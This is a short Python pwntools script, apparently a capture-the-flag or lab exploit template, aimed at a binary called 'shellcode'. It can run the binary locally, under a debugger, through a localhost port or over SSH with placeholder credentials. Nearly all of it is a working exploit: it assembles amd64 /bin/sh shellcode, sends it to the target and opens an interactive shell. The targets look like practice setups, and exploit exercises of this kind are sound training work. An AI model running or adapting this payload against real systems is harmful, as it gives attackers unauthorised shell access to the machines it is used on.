#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/shellcode'

e = ELF('./build/shellcode')
rop = ROP('./build/shellcode')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5500)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/shellcode', cwd='problemDir')
else:
    p = e.process()

payload = asm(pwnlib.shellcraft.amd64.sh())
print(len(payload))

p.sendline(payload)
p.interactive()
